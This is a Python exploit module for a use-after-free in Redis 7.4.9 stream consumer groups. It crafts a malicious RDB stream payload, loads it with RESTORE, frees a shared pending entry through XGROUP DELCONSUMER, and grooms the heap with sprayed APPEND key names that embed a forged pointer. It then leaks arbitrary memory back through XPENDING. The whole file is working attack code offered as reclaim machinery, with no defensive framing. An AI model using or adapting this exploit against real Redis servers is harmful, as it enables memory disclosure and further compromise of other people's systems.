#!/usr/bin/env python3
"""P74_g2: single-free UAF reclaim machinery for redis 7.4.9 (DEBUG-free).

The 22-char key-name sds reclaim of the freed shared streamNACK C:
drain bin24 tcache (260 pipelined 22-char-name APPENDs), 8 sac SETs,
RESTORE the type-19 stream, XGROUP DELCONSUMER alice, APPEND spray
(no 24-class transient argv robjs, no expires dictEntry), probe XINFO
FULL once after the whole spray (probing churns bin24 via reply
listNodes / "FULL" argv robj).

P (the fake streamConsumer address, C[16:24]) is supplied by the caller;
7.4's streamConsumer has name at +16, so XPENDING echoes *(P+16).
No DEBUG OBJECT, no fck embstr: P points into a leaked Lua table struct.
"""
import struct
import sys

sys.path.insert(0, "/home/c/redis-exp")
from A_lib import _crc as crc, encode, Resp

RDB_VERSION = 12
RDB_TYPE_STREAM_LISTPACKS_2 = 19
MARKER = b"G2MARK42"


def rdb_len(n):
    if n < 0x40:
        return bytes([n])
    if n < 0x4000:
        return bytes([0x80 | (n >> 8), n & 0xFF])
    if n <= 0xFFFFFFFF:
        return b"\x81" + struct.pack(">I", n)
    return b"\x82" + struct.pack(">Q", n)


def rdb_str(b):
    return rdb_len(len(b)) + b


def build_payload(group=b"group1", consumers=(b"alice", b"bobxx")):
    rawid = b"\x01" + b"\x00" * 15
    mstime = struct.pack("<q", 1700000000000)
    p = bytes([RDB_TYPE_STREAM_LISTPACKS_2])
    p += rdb_len(0)                       # listpacks
    p += rdb_len(0)                       # length
    p += rdb_len(0) + rdb_len(0)          # last_id
    p += rdb_len(0) + rdb_len(0)          # first_id
    p += rdb_len(0) + rdb_len(0)          # max_deleted_entry_id
    p += rdb_len(0)                       # entries_added
    p += rdb_len(1)                       # cgroups
    p += rdb_str(group)
    p += rdb_len(0) + rdb_len(0)          # cg last_id
    p += rdb_len(0)                       # entries_read
    p += rdb_len(1)                       # global PEL size
    p += rawid + mstime + rdb_len(1)
    p += rdb_len(len(consumers))
    for name in consumers:
        p += rdb_str(name)
        p += mstime
        p += rdb_len(1)
        p += rawid
    body = p + struct.pack("<H", RDB_VERSION)
    return body + struct.pack("<Q", crc.crc64(0, body, len(body)))


def cmd(r, s, *args, quiet=True):
    s.sendall(encode(*args))
    rep = r.read()
    if not quiet:
        p = rep if not isinstance(rep, (bytes, list)) else repr(rep)[:160]
        print("[redis] %-40s -> %s" % (" ".join(str(a)[:22] for a in args), p))
    if isinstance(rep, str) and rep.startswith("-ERR"):
        raise RuntimeError(rep)
    return rep


def num(x):
    if isinstance(x, str) and x[:1] in ":+":
        try:
            return int(x[1:])
        except ValueError:
            return None
    return None


def xinfo_count(r, s, key):
    """delivery_count (chunk[8:16]) of the first consumer-PEL entry."""
    rep = cmd(r, s, "XINFO", "STREAM", key, "FULL")
    found = [None]

    def walk(x):
        if isinstance(x, list):
            if (len(x) == 3 and isinstance(x[0], bytes) and b"-" in x[0]
                    and num(x[1]) is not None and num(x[2]) is not None):
                found[0] = num(x[2])
            for y in x:
                walk(y)

    walk(rep)
    return found[0]


_dtag = [0]


def reclaim_echo(r, s, P, skey):
    """One reclaim cycle: land a 22-char key sds embedding P on the freed
    NACK chunk C (nack->consumer = P), then XPENDING-echo the memory at
    *(P+16).  Returns (status, echo_bytes).  status: win/lost/stale.
    No Lua, no DEBUG — the fake consumer is P's own memory."""
    for i in range(8):
        cmd(r, s, "SET", "sac%02d" % i, "v" * 12)
    n0 = _dtag[0]
    _dtag[0] += 260
    reps = r.pipe([("APPEND", b"d" + ("%021d" % (n0 + i)).encode(), "vvvvv")
                   for i in range(260)])
    assert all(x == ":5" for x in reps), reps[:3]
    assert len(skey) == 4
    rep = cmd(r, s, "RESTORE", skey, "0", build_payload())
    assert str(rep).startswith("+OK"), rep
    cmd(r, s, "XGROUP", "DELCONSUMER", skey, "group1", "alice")
    p7 = struct.pack("<Q", P)[:7]
    for k in range(8):
        kn = (b"g%06d" % k) + MARKER + p7
        assert len(kn) == 22
        cmd(r, s, "APPEND", kn, "vvvvv")
    cnt = xinfo_count(r, s, skey)
    if cnt != struct.unpack("<Q", MARKER)[0]:
        return ("stale" if cnt == 1 else "lost"), None
    rep = cmd(r, s, "XPENDING", skey, "group1", "-", "+", "10", "bobxx")
    leak = rep[0][1] if (isinstance(rep, list) and rep
                         and isinstance(rep[0], list)) else None
    return "win", (leak if isinstance(leak, bytes) else b"")
